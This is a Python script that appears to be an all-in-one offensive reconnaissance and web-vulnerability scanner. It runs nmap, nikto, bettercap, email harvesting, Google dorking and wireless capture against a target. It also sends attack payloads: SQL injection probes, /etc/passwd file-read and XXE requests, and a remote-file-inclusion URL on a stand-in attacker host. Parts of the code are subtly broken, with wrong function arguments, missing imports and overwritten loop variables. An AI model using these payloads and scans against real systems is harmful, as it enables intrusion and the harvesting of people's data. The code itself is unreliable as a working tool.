import socket
import os
import subprocess
import threading
import argparse
import requests
from bs4 import BeautifulSoup
from scapy.all import *

def print_to_file(filename, content):
   with open(filename, "a") as file:
       file.write(content + "\n")

def perform_whois(ip, filename):
   try:
       output = subprocess.check_output(["whois", ip]).decode()
       print_to_file(filename, "WHOIS Information:")
       print_to_file(filename, output)
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] WHOIS lookup failed")

def perform_dns_lookup(ip, filename):
   try:
       hostname = socket.gethostbyaddr(ip)[0]
       print_to_file(filename, f"[+] Hostname: {hostname}")
   except socket.herror:
       print_to_file(filename, "[-] Reverse DNS lookup failed")

def perform_ping(ip, filename):
   try:
       subprocess.check_output(["ping", "-c", "4", ip])
       print_to_file(filename, "[+] Host is alive")
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] Host is unreachable")

def nmap_scan(ip, filename):
   try:
       output = subprocess.check_output(["nmap", "-sV", "-vvv", "-Pn", "-A", ip]).decode()
       print_to_file(filename, "Nmap Scan Results:")
       print_to_file(filename, output)
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] Nmap scan failed")

def nikto_scan(ip, filename):
   try:
       output = subprocess.check_output(["nikto", "-h", ip]).decode()
       print_to_file(filename, "Nikto Scan Results:")
       print_to_file(filename, output)
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] Nikto scan failed")

def rustscan(ip, filename):
   try:
       output = subprocess.check_output(["rustscan", "-a", ip]).decode()
       print_to_file(filename, "RustScan Results:")
       print_to_file(filename, output)
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] RustScan failed")

def bettercap(ip, filename):
   try:
       output = subprocess.check_output(["bettercap", "-t", ip]).decode()
       print_to_file(filename, "Bettercap Results:")
       print_to_file(filename, output)
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] Bettercap failed")
def web_app_scan(url):
   try:
       # Send a GET request to the target URL
       response = requests.get(url)
       
       # Parse the HTML content using BeautifulSoup
       soup = BeautifulSoup(response.text, "html.parser")
       
       # Check for potential vulnerabilities
       
       # SQL Injection
       forms = soup.find_all("form")
       for form in forms:
           inputs = form.find_all("input")
           for input_field in inputs:
               if "id" in input_field.attrs:
                   payload = "'"
                   input_field["value"] = payload
                   post_data = {}
                   for input_field in inputs:
                       post_data[input_field["name"]] = input_field["value"]
                   post_response = requests.post(url, data=post_data)
                   if "error" in post_response.text.lower():
                       print("[+] Potential SQL Injection vulnerability found")
       
       # Cross-Site Scripting (XSS)
       scripts = soup.find_all("script")
       for script in scripts:
           if "src" in script.attrs:
               script_url = script["src"]
               if script_url.startswith("http") or script_url.startswith("//"):
                   script_response = requests.get(script_url)
                   if "<script>" in script_response.text:
                       print("[+] Potential XSS vulnerability found")
       
       # Directory Traversal
       links = soup.find_all("a")
       for link in links:
           if "href" in link.attrs:
               target = link["href"]
               if "../" in target:
                   traversal_url = url + target
                   traversal_response = requests.get(traversal_url)
                   if "root" in traversal_response.text.lower():
                       print("[+] Potential Directory Traversal vulnerability found")
       
       # Local File Inclusion (LFI)
       params = soup.find_all("input", {"type": "file"})
       for param in params:
           if "name" in param.attrs:
               file_param = param["name"]
               payload = "/etc/passwd"
               lfi_url = url + "?" + file_param + "=" + payload
               lfi_response = requests.get(lfi_url)
               if "root:" in lfi_response.text:
                   print("[+] Potential LFI vulnerability found")
       
       # Remote File Inclusion (RFI)
       params = soup.find_all("input", {"type": "text"})
       for param in params:
           if "name" in param.attrs:
               text_param = param["name"]
               payload = "http://attacker.com/malicious.php"
               rfi_url = url + "?" + text_param + "=" + payload
               rfi_response = requests.get(rfi_url)
               if "malicious" in rfi_response.text:
                   print("[+] Potential RFI vulnerability found")
       
       # Cross-Site Request Forgery (CSRF)
       forms = soup.find_all("form")
       for form in forms:
           if "action" in form.attrs:
               csrf_url = form["action"]
               if csrf_url == "":
                   csrf_url = url
               if "method" in form.attrs:
                   method = form["method"].lower()
               else:
                   method = "get"
               inputs = form.find_all("input")
               post_data = {}
               for input_field in inputs:
                   if "name" in input_field.attrs:
                       post_data[input_field["name"]] = input_field.get("value", "")
               if method == "post":
                   csrf_response = requests.post(csrf_url, data=post_data)
               else:
                   csrf_response = requests.get(csrf_url, params=post_data)
               if "logout" in csrf_response.text.lower():
                   print("[+] Potential CSRF vulnerability found")
       
       # Insecure Direct Object References (IDOR)
       urls = []
       for link in soup.find_all("a"):
           urls.append(link.get("href"))
       for url in urls:
           if "id=" in url:
               original_id = url.split("id=")[1]
               new_id = original_id + "1"
               new_url = url.replace(original_id, new_id)
               idor_response = requests.get(new_url)
               if "user" in idor_response.text.lower():
                   print("[+] Potential IDOR vulnerability found")
       
       # Sensitive Information Disclosure
       comments = soup.find_all(string=lambda text: isinstance(text, Comment))
       for comment in comments:
           if "password" in comment.lower() or "username" in comment.lower():
               print("[+] Potential sensitive information disclosure found")
       
       # Unrestricted File Upload
       file_inputs = soup.find_all("input", {"type": "file"})
       for file_input in file_inputs:
           print("[+] Potential unrestricted file upload found")
       
       # Server-Side Request Forgery (SSRF)
       urls = []
       for link in soup.find_all("a"):
           urls.append(link.get("href"))
       for url in urls:
           if "http://" in url or "https://" in url:
               ssrf_response = requests.get(url)
               if "aws" in ssrf_response.text.lower():
                   print("[+] Potential SSRF vulnerability found")
       
       # XML External Entity (XXE) Injection
       xml_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
       xxe_response = requests.post(url, data=xml_data)
       if "root:" in xxe_response.text:
           print("[+] Potential XXE vulnerability found")
       
       # Open Redirect
       urls = []
       for link in soup.find_all("a"):
           urls.append(link.get("href"))
       for url in urls:
           if "url=" in url:
               redirect_url = url.split("url=")[1]
               if "http://" in redirect_url or "https://" in redirect_url:
                   print("[+] Potential Open Redirect vulnerability found")
       
       # Broken Access Control
       admin_urls = ["/admin", "/administrator", "/admin.php", "/admin.aspx"]
       for admin_url in admin_urls:
           admin_response = requests.get(url + admin_url)
           if "dashboard" in admin_response.text.lower():
               print("[+] Potential Broken Access Control vulnerability found")
       
       # Security Misconfiguration
       robots_url = url + "/robots.txt"
       robots_response = requests.get(robots_url)
       if "disallow:" in robots_response.text.lower():
           print("[+] Potential security misconfiguration found")
       
       # Insufficient Logging and Monitoring
       log_files = ["/var/log/apache2/access.log", "/var/log/apache2/error.log", "/var/log/nginx/access.log", "/var/log/nginx/error.log"]
       for log_file in log_files:
           log_url = url + log_file
           log_response = requests.get(log_url)
           if "GET" in log_response.text or "POST" in log_response.text:
               print("[+] Potential insufficient logging and monitoring found")
   
   except requests.exceptions.RequestException as e:
       print("[-] An error occurred while performing the web application scan:")
       print(str(e))
def social_media_recon(company, filename):
   try:
       print_to_file(filename, f"[+] Searching for {company} on social media...")
       
       twitter_url = f"https://twitter.com/search?q={company}"
       twitter_response = requests.get(twitter_url)
       print_to_file(filename, f"[+] Twitter search for {company}: {twitter_url}")
       
       linkedin_url = f"https://www.linkedin.com/search/results/companies/?keywords={company}"
       linkedin_response = requests.get(linkedin_url)
       print_to_file(filename, f"[+] LinkedIn search for {company}: {linkedin_url}")
       
       facebook_url = f"https://www.facebook.com/search/top/?q={company}"
       facebook_response = requests.get(facebook_url)
       print_to_file(filename, f"[+] Facebook search for {company}: {facebook_url}")
       
       instagram_url = f"https://www.instagram.com/explore/tags/{company}/"
       instagram_response = requests.get(instagram_url)
       print_to_file(filename, f"[+] Instagram search for {company}: {instagram_url}")
       
   except requests.exceptions.RequestException as e:
       print_to_file(filename, "[-] An error occurred while performing social media reconnaissance:")
       print_to_file(filename, str(e))

def email_harvesting(domain, filename):
   try:
       print_to_file(filename, f"[+] Harvesting emails for {domain}...")
       
       url = f"https://www.google.com/search?q=%40{domain}"
       response = requests.get(url)
       soup = BeautifulSoup(response.text, "html.parser")
       emails = set(re.findall(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", soup.get_text()))
       print_to_file(filename, f"[+] Found {len(emails)} email addresses:")
       for email in emails:
           print_to_file(filename, email)
           
   except requests.exceptions.RequestException as e:
       print_to_file(filename, "[-] An error occurred while performing email harvesting:")
       print_to_file(filename, str(e))

def subdomain_enumeration(domain, filename):
   try:
       print_to_file(filename, f"[+] Enumerating subdomains for {domain}...")
       
       url = f"https://crt.sh/?q=%.{domain}"
       response = requests.get(url)
       soup = BeautifulSoup(response.text, "html.parser")
       subdomains = set()
       for cert_data in soup.find_all("td", class_="outer"):
           subdomain = cert_data.text.strip().split("\n")[0]
           if subdomain.endswith(domain) and "*" not in subdomain:
               subdomains.add(subdomain)
       print_to_file(filename, f"[+] Found {len(subdomains)} subdomains:")
       for subdomain in subdomains:
           print_to_file(filename, subdomain)
       
   except requests.exceptions.RequestException as e:
       print_to_file(filename, "[-] An error occurred while performing subdomain enumeration:")
       print_to_file(filename, str(e))

def google_dorking(company, filename):
   try:
       print_to_file(filename, f"[+] Performing Google dorking for {company}...")
       
       dorks = [
           f"site:{company}.com filetype:pdf",
           f"site:{company}.com intitle:index.of",
           f"site:{company}.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini",
           f"site:{company}.com ext:sql | ext:dbf | ext:mdb",
           f"site:{company}.com inurl:http | inurl:https"
       ]
       
       for dork in dorks:
           url = f"https://www.google.com/search?q={dork}"
           response = requests.get(url)
           soup = BeautifulSoup(response.text, "html.parser")
           search_results = soup.find_all("div", class_="g")
           print_to_file(filename, f"[+] Results for dork: {dork}")
           for result in search_results:
               link = result.find("a")["href"]
               print_to_file(filename, link)
           
   except requests.exceptions.RequestException as e:
       print_to_file(filename, "[-] An error occurred while performing Google dorking:")
       print_to_file(filename, str(e))

def voip_recon(ip, filename):
   try:
       output = subprocess.check_output(["svmap", ip]).decode()
       print_to_file(filename, "VoIP Recon Results:")
       print_to_file(filename, output)
   except subprocess.CalledProcessError:
       print_to_file(filename, "[-] VoIP reconnaissance failed")

def wireless_recon(filename):
   try:
       print_to_file(filename, "[+] Performing wireless network reconnaissance...")
       
       subprocess.call(["airmon-ng", "start", "wlan0"])
       
       output = subprocess.check_output(["airodump-ng", "-w", "wireless_capture", "--output-format", "csv", "wlan0mon"]).decode()
       print_to_file(filename, "Wireless Recon Results:")
       print_to_file(filename, output)
       
   except subprocess.CalledProcessError as e:
       print_to_file(filename, "[-] An error occurred while performing wireless network reconnaissance:")
       print_to_file(filename, str(e))
   finally:
       subprocess.call(["airmon-ng", "stop", "wlan0mon"])

def main():
   parser = argparse.ArgumentParser(description="Reconnaissance Tool")
   parser.add_argument("target", help="Target IP address or domain")
   parser.add_argument("-o", "--output", default="recon_results.txt", help="Output file to store the results")
   args = parser.parse_args()

   ip = args.target
   filename = args.output

   threads = []

   whois_thread = threading.Thread(target=perform_whois, args=(ip, filename))
   dns_thread = threading.Thread(target=perform_dns_lookup, args=(ip, filename))
   ping_thread = threading.Thread(target=perform_ping, args=(ip, filename))
   nmap_thread = threading.Thread(target=nmap_scan, args=(ip, filename))
   nikto_thread = threading.Thread(target=nikto_scan, args=(ip, filename))
   rustscan_thread = threading.Thread(target=rustscan, args=(ip, filename))
   bettercap_thread = threading.Thread(target=bettercap, args=(ip, filename))
   web_app_thread = threading.Thread(target=web_app_scan, args=(f"http://{ip}", filename))
   social_media_thread = threading.Thread(target=social_media_recon, args=("CompanyName", filename))
   email_harvesting_thread = threading.Thread(target=email_harvesting, args=("company.com", filename))
   subdomain_thread = threading.Thread(target=subdomain_enumeration, args=("company.com", filename))
   google_dorking_thread = threading.Thread(target=google_dorking, args=("CompanyName", filename))
   voip_thread = threading.Thread(target=voip_recon, args=(ip, filename))
   wireless_thread = threading.Thread(target=wireless_recon, args=(filename,))

   threads.extend([
       whois_thread, dns_thread, ping_thread, nmap_thread, nikto_thread,
       rustscan_thread, bettercap_thread, web_app_thread, social_media_thread,
       email_harvesting_thread, subdomain_thread, google_dorking_thread,
       voip_thread, wireless_thread
   ])

   for thread in threads:
       thread.start()

   for thread in threads:
       thread.join()

if __name__ == "__main__":
   main()